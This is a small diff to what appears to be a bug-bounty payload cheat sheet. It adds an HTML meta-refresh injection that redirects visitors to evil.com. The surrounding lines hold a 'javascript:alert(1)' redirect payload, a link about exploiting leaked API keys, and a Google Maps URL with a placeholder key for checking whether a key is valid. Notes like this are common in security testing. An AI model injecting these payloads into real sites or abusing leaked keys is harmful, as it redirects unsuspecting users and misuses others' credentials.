@@ -1009,6 +1009,9 @@ Apache Traffic Server
 /#/../?r=javascript:alert(1)
 
 
+IF you can inject this payload then you will redirect all people to this url ==>  <meta http-equiv="Refresh"content="5;url=http://evil.com">
+
+
 exploit api keys >>>>>>    https://github.com/streaak/keyhacks#Algolia-API-key
 
 https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=fiojamiofmaofi   => to verify the google key => https://hackerone.com/reports/1065041
